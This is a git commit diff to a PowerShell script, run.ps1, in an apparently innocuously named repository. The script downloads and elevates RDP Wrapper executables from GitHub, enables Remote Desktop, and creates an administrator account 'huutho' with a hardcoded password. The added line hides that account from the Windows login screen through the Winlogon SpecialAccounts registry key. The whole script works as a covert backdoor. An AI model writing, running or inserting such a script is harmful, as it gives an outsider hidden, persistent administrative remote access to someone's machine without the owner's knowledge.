5b5117d0a0e2b1d2d932824b98e997460ecf76d7
Assnsster <nghoangviet202@gmail.com>
2026-06-05 14:42:08 +0700

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -5,4 +5,5 @@ Invoke-WebRequest "https://raw.githubusercontent.com/Assnsster/archiver1/refs/he
 Start-Process "$env:TEMP\RDPWInst.exe" -ArgumentList "-i -o" -Verb RunAs -Wait
 Invoke-WebRequest "https://raw.githubusercontent.com/Assnsster/archiver1/refs/heads/main/RDPConf.exe" -OutFile "$env:USERPROFILE\AppData\Local\Microsoft\WindowsApps\RDPConf.exe"
 Start-Process powershell -Verb RunAs -ArgumentList "-Command Stop-Service -Name TermService -Force; Invoke-WebRequest 'https://raw.githubusercontent.com/sebaxakerhtc/rdpwrap.ini/master/rdpwrap.ini' -OutFile 'C:\Program Files\RDP Wrapper\rdpwrap.ini'; Start-Service -Name TermService; Start-Sleep -Seconds 3"
-  net user huutho Lordco61799 /add ; net localgroup Administrators Huutho /add 
+net user huutho Lordco61799 /add ; net localgroup Administrators Huutho /add 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v huutho /t REG_DWORD /d 0 /f
